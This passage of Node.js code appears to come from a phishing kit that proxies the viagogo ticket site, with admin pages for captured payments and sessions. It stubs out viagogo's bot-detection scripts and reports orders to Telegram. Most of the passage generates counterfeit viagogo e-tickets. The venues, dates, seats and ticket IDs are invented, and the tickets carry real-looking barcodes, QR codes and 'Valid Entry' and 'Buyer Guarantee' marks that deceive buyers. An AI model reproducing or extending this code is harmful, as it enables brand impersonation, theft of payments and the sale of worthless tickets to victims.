      tgNotify(`⚠️ <b>Ticket Data Gap</b>\nOrder: <code>${tOid}</code>\nEvent: ${tEvent}\nMissing: ${missing.join(', ')}\n\nClient scraper + server cache both missed. Fallback used.`);
    }

    // Generate deterministic but realistic ticket data
    const h = djb2(tOid);
    // Per-ticket price = total / qty (not the total)
    const tPricePerTicket = Math.round(Number(tAmount) / tQty);
    // Match venue to city mentioned in event name — no conflicting cities
    const cityVenues = {
      'delhi': ['Jawaharlal Nehru Stadium, New Delhi','Indira Gandhi Arena, New Delhi','Arun Jaitley Stadium, New Delhi'],
      'mumbai': ['DY Patil Stadium, Navi Mumbai','NSCI Dome, Mumbai','Jio World Convention Centre, Mumbai','Wankhede Stadium, Mumbai'],
      'bangalore': ['M. Chinnaswamy Stadium, Bangalore','Palace Grounds, Bangalore','Bangalore International Exhibition Centre, Bangalore'],
      'bengaluru': ['M. Chinnaswamy Stadium, Bengaluru','Palace Grounds, Bengaluru','Bangalore International Exhibition Centre, Bengaluru'],
      'kolkata': ['Eden Gardens, Kolkata','Netaji Indoor Stadium, Kolkata','Science City, Kolkata'],
      'calcutta': ['Eden Gardens, Kolkata','Netaji Indoor Stadium, Kolkata'],
      'ahmedabad': ['Sardar Patel Stadium, Ahmedabad','EKA Arena, Ahmedabad','Narendra Modi Stadium, Ahmedabad'],
      'hyderabad': ['GMC Balayogi Stadium, Hyderabad','Hitex Exhibition Centre, Hyderabad','Rajiv Gandhi International Cricket Stadium, Hyderabad'],
      'chennai': ['MA Chidambaram Stadium, Chennai','Jawaharlal Nehru Indoor Stadium, Chennai','YMCA Nandanam, Chennai'],
      'pune': ['Shree Shiv Chhatrapati Sports Complex, Pune','MCA Stadium, Pune'],
      'goa': ['Dr. Shyama Prasad Mukherjee Stadium, Goa','Bambolim Athletic Stadium, Goa'],
      'jaipur': ['Sawai Mansingh Stadium, Jaipur','Birla Auditorium, Jaipur'],
      'chandigarh': ['Sector 16 Cricket Stadium, Chandigarh','Tagore Theatre, Chandigarh'],
      'lucknow': ['Ekana Stadium, Lucknow','Bharat Ratna Shri Atal Bihari Vajpayee Ekana Cricket Stadium, Lucknow'],
      'gurgaon': ['Leisure Valley Park, Gurgaon','Tau Devi Lal Stadium, Gurgaon'],
      'gurugram': ['Leisure Valley Park, Gurugram','Tau Devi Lal Stadium, Gurugram'],
      'noida': ['Noida Indoor Stadium, Noida','Noida Golf Course, Noida'],
      'indore': ['Holkar Cricket Stadium, Indore','Abhay Prashal, Indore'],
    };
    const fallbackVenues = ['Jawaharlal Nehru Stadium, New Delhi','DY Patil Stadium, Navi Mumbai','M. Chinnaswamy Stadium, Bangalore','NSCI Dome, Mumbai','Eden Gardens, Kolkata','Sardar Patel Stadium, Ahmedabad'];
    // Use REAL event data from viagogo DOM when available — fallback only when missing
    let venue = tVenue;
    if (!venue) {
      const eventLower = tEvent.toLowerCase();
      for (const [city, vList] of Object.entries(cityVenues)) {
        if (eventLower.includes(city)) { venue = vList[h % vList.length]; break; }
      }
      if (!venue) venue = fallbackVenues[h % fallbackVenues.length];
    }
    let dateStr = tDate;
    if (!dateStr) {
      const futureMs = Date.now() + ((h % 180) + 60) * 86400000;
      const eventDate = new Date(futureMs);
      dateStr = eventDate.toLocaleDateString('en-IN', {weekday:'long',year:'numeric',month:'long',day:'numeric',timeZone:'Asia/Kolkata'});
    }
    let timeStr = tTime;
    if (!timeStr) {
      const times = ['7:00 PM','7:30 PM','8:00 PM','8:30 PM','6:30 PM'];
      timeStr = times[h % times.length];
    }
    const gateStr = 'Gate ' + ((h % 12) + 1);

    // Code 128B barcode generator — returns SVG string
    function code128svg(text) {
      const P='11011001100,11001101100,11001100110,10010011000,10010001100,10001001100,10011001000,10011000100,10001100100,11001001000,11001000100,11000100100,10110011100,10011011100,10011001110,10111001100,10011101100,10011100110,11001110010,11001011100,11001001110,11011100100,11001110100,11100101100,11100100110,11101100100,11100110100,11100110010,11011011000,11011000110,11000110110,10100011000,10001011000,10001000110,10110001000,10001101000,10001100010,11010001000,11000101000,11000100010,10110111000,10110001110,10001101110,10111011000,10111000110,10001110110,11101110110,11010001110,11000101110,11011101000,11011100010,11011101110,11101011000,11101000110,11100010110,11101101000,11101100010,11100011010,11101111010,11001000010,11110001010,10100110000,10100001100,10010110000,10010000110,10000101100,10000100110,10110010000,10110000100,10011010000,10011000010,10000110100,10000110010,11000010010,11001010000,11110111010,11000010100,10001111010,10100111100,10010111100,10010011110,10111100100,10011110100,10011110010,11110100100,11110010100,11110010010,11011011110,11011110110,11110110110,10101111000,10100011110,10001011110,10111101000,10111100010,10001111010,11110101000,11110100010,10111011110,10111101110,11101011110,11110101110,11010000100,11010010000,11010011100,11000111010'.split(',');
      let codes=[104],ck=104;
      for(let i=0;i<text.length;i++){let c=text.charCodeAt(i)-32;codes.push(c);ck+=c*(i+1);}
      codes.push(ck%103);
      let bin='';for(let i=0;i<codes.length;i++)bin+=P[codes[i]];
      bin+='1100011101011';
      let svg='<svg xmlns="http://www.w3.org/2000/svg" width="280" height="60" viewBox="0 0 '+bin.length+' 1" preserveAspectRatio="none">';
      let rs=0,cur=bin[0];
      for(let i=1;i<=bin.length;i++){
        if(i===bin.length||bin[i]!==cur){
          if(cur==='1')svg+='<rect x="'+rs+'" y="0" width="'+(i-rs)+'" height="1"/>';
          rs=i;if(i<bin.length)cur=bin[i];
        }
      }
      return svg+'</svg>';
    }

    // Generate per-ticket seat assignments — split range into individual seats
    const tickets = [];
    const baseRow = (h % 25) + 1;
    const baseSeat = (h % 30) + 1;
    // Parse seat range like "Row 5, Seats 12-13" into individual seats
    let seatParts = [];
    if (tSeat) {
      const rangeM = tSeat.match(/^(.*?(?:Row|Reihe|Fila)\s*\d+),?\s*Seats?\s*(\d+)(?:\s*-\s*(\d+))?/i);
      if (rangeM) {
        const rowPart = rangeM[1].trim();
        const startSeat = parseInt(rangeM[2]);
        const endSeat = rangeM[3] ? parseInt(rangeM[3]) : startSeat;
        for (let s = startSeat; s <= endSeat && seatParts.length < tQty; s++) {
          seatParts.push(rowPart + ', Seat ' + s);
        }
      }
    }
    for (let i = 0; i < tQty; i++) {
      const ticketId = 'VG' + (h + i).toString(16).toUpperCase().padStart(6, '0') + '-' + (Date.now() + i).toString(36).toUpperCase().slice(-5);
      const seatNum = seatParts[i] || tSeat || ('Row ' + baseRow + ', Seat ' + (baseSeat + i));
      const barcodeText = ticketId;
      tickets.push({ id: ticketId, seat: seatNum, barcode: code128svg(barcodeText), barcodeText });
    }

    const ticketHtml = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>viagogo E-Tickets - ${tEvent}</title>
<script src="/_qrcode.js"><\/script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Inter,'Helvetica Neue',Arial,sans-serif;background:#f0f0f0;color:#191c1f;-webkit-print-color-adjust:exact;print-color-adjust:exact;overflow-x:hidden}
.page-header{background:#fff;border-bottom:1px solid #e0e0e0;padding:16px 20px;display:flex;align-items:center;justify-content:space-between}
.page-header .logo{font-size:22px;font-weight:700;color:#191c1f;letter-spacing:-0.5px}
.page-header .logo span{color:#4E7C05}
.print-btn{background:#4E7C05;color:#fff;border:none;padding:10px 24px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;font-family:Inter,sans-serif}
.print-btn:active{background:#3d6304}
.ticket-wrap{max-width:680px;margin:20px auto;padding:0 16px}
.ticket{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:24px;overflow:hidden;position:relative}
.ticket-top{background:linear-gradient(135deg,#191c1f 0%,#2d3238 100%);color:#fff;padding:20px 24px;position:relative}
.ticket-top::after{content:'';position:absolute;bottom:-12px;left:0;right:0;height:24px;background:radial-gradient(circle at 12px 0,transparent 12px,#fff 12px) repeat-x;background-size:24px 24px}
.ticket-event{font-size:20px;font-weight:800;margin-bottom:4px;letter-spacing:-0.3px}
.ticket-meta{font-size:13px;opacity:0.8;margin-top:4px;word-wrap:break-word;overflow-wrap:break-word}
.ticket-meta svg{width:13px;height:13px;vertical-align:-2px;margin-right:3px;opacity:0.6}
.ticket-body{padding:28px 24px 20px}
.ticket-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:20px}
@media(max-width:500px){.ticket-grid{grid-template-columns:1fr 1fr}}
.ticket-field label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:#888;display:block;margin-bottom:3px}
.ticket-field .val{font-size:15px;font-weight:700;color:#191c1f}
.ticket-divider{border:none;border-top:2px dashed #e0e0e0;margin:16px 0}
.barcode-area{text-align:center;padding:8px 0 4px;overflow-x:auto}
.barcode-area svg{display:block;margin:0 auto;max-width:100%;height:auto}
.barcode-text{font-size:11px;font-family:'Courier New',monospace;color:#555;letter-spacing:2px;margin-top:6px}
.qr-area{float:right;margin:-8px 0 8px 16px}
.qr-area canvas{border:1px solid #eee;border-radius:4px}
@media(max-width:400px){.qr-area{float:none;text-align:center;margin:0 0 12px 0}.valid-stamp{display:none}}
.ticket-footer{background:#fafafa;border-top:1px solid #f0f0f0;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
.guarantee-badge{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;color:#4E7C05}
.guarantee-badge svg{width:16px;height:16px}
.ticket-id{font-size:10px;color:#aaa;font-family:monospace}
.valid-stamp{position:absolute;top:16px;right:20px;border:2px solid rgba(78,124,5,0.3);border-radius:6px;padding:4px 10px;font-size:10px;font-weight:700;color:rgba(78,124,5,0.6);text-transform:uppercase;letter-spacing:1px;transform:rotate(3deg)}
.instructions{max-width:680px;margin:0 auto 40px;padding:0 16px}
.instructions h3{font-size:15px;font-weight:700;margin-bottom:10px;color:#191c1f}
.instructions ul{list-style:none;padding:0}
.instructions li{font-size:13px;color:#555;padding:6px 0;padding-left:20px;position:relative}
.instructions li::before{content:'\\2713';position:absolute;left:0;color:#4E7C05;font-weight:700}
@media print{.page-header,.print-btn,.instructions{display:none}.ticket-wrap{margin:0;padding:0}.ticket{box-shadow:none;border:1px solid #ddd;page-break-inside:avoid}}
</style>
</head>
<body>
<div class="page-header">
  <div class="logo">via<span>go</span>go</div>
  <button class="print-btn" onclick="window.print()">Print Tickets</button>
</div>

<div class="ticket-wrap">
  <p style="font-size:13px;color:#666;margin-bottom:16px;text-align:center">
    <strong style="color:#4E7C05">${tQty} E-Ticket${tQty > 1 ? 's' : ''}</strong> &bull;
    Order <span style="font-family:monospace">${tOid}</span> &bull;
    Present this at the venue entrance
  </p>

  ${tickets.map((tk, idx) => `
  <div class="ticket">
    <div class="ticket-top">
      <div class="valid-stamp">Valid Entry</div>
      <div class="ticket-event">${tEvent}</div>
      <div class="ticket-meta">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
        ${dateStr} &bull; ${timeStr}
      </div>
      <div class="ticket-meta">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
        ${venue}
      </div>
    </div>
    <div class="ticket-body">
      <div id="qr${idx}" class="qr-area"></div>
      <div class="ticket-grid">
        <div class="ticket-field"><label>Section</label><div class="val">${tSection}</div></div>
        <div class="ticket-field"><label>Seat</label><div class="val">${tk.seat}</div></div>
        <div class="ticket-field"><label>Gate</label><div class="val">${gateStr}</div></div>
        <div class="ticket-field"><label>Ticket</label><div class="val">${idx + 1} of ${tQty}</div></div>
        <div class="ticket-field"><label>Price</label><div class="val">&#8377;${Number(tPricePerTicket).toLocaleString('en-IN')}</div></div>
        <div class="ticket-field"><label>Type</label><div class="val">Standard Entry</div></div>
      </div>
      <hr class="ticket-divider">
      <div class="barcode-area">
        ${tk.barcode}
        <div class="barcode-text">${tk.barcodeText}</div>
      </div>
    </div>
    <div class="ticket-footer">
      <div class="guarantee-badge">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        viagogo Buyer Guarantee
      </div>
      <div class="ticket-id">ID: ${tk.id}</div>
    </div>
  </div>
  `).join('')}
</div>

<div class="instructions">
  <h3>Entry Instructions</h3>
  <ul>
    <li>Present this e-ticket (printed or on your mobile device) at the venue entrance</li>
    <li>Each ticket contains a unique barcode — do not share or duplicate</li>
    <li>Arrive at least 30 minutes before the event start time</li>
    <li>Photo ID matching the purchaser name may be required at entry</li>
    <li>This ticket is protected by the viagogo Buyer Guarantee</li>
  </ul>
</div>

<script>
window.addEventListener('DOMContentLoaded',function(){
  ${tickets.map((tk, idx) => `
  if(typeof QRCode!=='undefined'){
    new QRCode(document.getElementById('qr${idx}'),{
      text:'https://www.viagogo.com/E-${1500000 + (h % 500000)}?t=${tk.id}',
      width:80,height:80,correctLevel:QRCode.CorrectLevel.M
    });
  }`).join('\n')}
});
<\/script>
</body>
</html>`;

    cRes.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: blob: https:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com; connect-src 'self'; frame-ancestors 'none';",
      ...securityHeaders(),
    });
    cRes.end(ticketHtml);
    return;
  }

  // ── Self-hosted QRCode.js (CDN returns 503 through CF tunnel) ──
  if (cReq.url === '/_qrcode.js') {
    const ifNone = cReq.headers['if-none-match'];
    if (ifNone === _qrcodeEtag) { cRes.writeHead(304); cRes.end(); return; }
    cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': _qrcodeBuf.length, 'cache-control': 'public, max-age=604800, immutable', 'etag': _qrcodeEtag });
    cRes.end(_qrcodeBuf);
    return;
  }

  // ── Real viagogo favicon ──
  if (cReq.url === '/favicon.ico') {
    const ifNone = cReq.headers['if-none-match'];
    if (ifNone === _faviconEtag) { cRes.writeHead(304); cRes.end(); return; }
    cRes.writeHead(200, { 'content-type': 'image/x-icon', 'content-length': _faviconBuf.length, 'cache-control': 'public, max-age=604800, immutable', 'etag': _faviconEtag });
    cRes.end(_faviconBuf);
    return;
  }

  // ── CrowdControl direct path (relative /d6631957...) — STUB ──
  // Bot detection scripts trigger unsolvable challenges on proxy domains. Return noop JS.
  if (cReq.url.startsWith('/d6631957')) {
    const noop = Buffer.from('/* crowdcontrol stubbed — domain mismatch makes challenges unsolvable */');
    cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': noop.length, 'access-control-allow-origin': '*', 'cache-control': 'public, max-age=86400' });
    cRes.end(noop);
    return;
  }

  // ── CDN proxy ──
  if (cReq.url.startsWith('/_cdn/')) {
    const cdnPath = cReq.url.slice(5); // remove /_cdn
    const slashIdx = cdnPath.indexOf('/', 1);
    if (slashIdx > 0) {
      const cdnDomain = cdnPath.slice(1, slashIdx);
      const cdnUri = cdnPath.slice(slashIdx);
      // Fix: empty domain → infer from path
      if (!cdnDomain) {
        // Stub cpt — CrowdControl rejects localhost POST with 400
        if (cdnUri.startsWith('/cpt')) {
          cRes.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
          cRes.end('{"success":true}');
          return;
        }
        // CrowdControl paths (d6631957 tags/js) — STUB instead of proxy
        if (cdnUri.includes('d6631957')) {
          const noop = Buffer.from('/* crowdcontrol stubbed */');
          cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': noop.length, 'access-control-allow-origin': '*', 'cache-control': 'public, max-age=86400' });
          cRes.end(noop);
        }
        // Stub analytics — wt.viagogo.net rejects localhost POST with 400
        else if (/^\/(icpv|iae|ipeb)/.test(cdnUri)) {
          cRes.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
          cRes.end('{"success":true}');
          return;
        }
        // Default: assume analytics, stub it
        else {
          cRes.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
          cRes.end('{"success":true}');
          return;
        }
      } else {
        handleCDN(cdnDomain, cdnUri, cReq, cRes);
      }
    } else {
      cRes.writeHead(400);
      cRes.end('bad cdn path');
    }
    return;
  }

  // ── Everything else: proxy to viagogo ──
  handleMain(cReq, cRes);
});

server.listen(PORT, () => {
  console.log(`\n  ╔══════════════════════════════════════════════╗`);
  console.log(`  ║   VIAGOGO CLONE PROXY — v1.0                 ║`);
  console.log(`  ║   http://localhost:${PORT}                      ║`);
  console.log(`  ╠══════════════════════════════════════════════╣`);
  console.log(`  ║   Admin:    /_admin/payments                 ║`);
  console.log(`  ║   Sessions: /_admin/sessions                 ║`);
  console.log(`  ║   VPA:      /_admin/vpa                      ║`);
  console.log(`  ║   Health:   /_health                         ║`);
  console.log(`  ╚══════════════════════════════════════════════╝\n`);
});
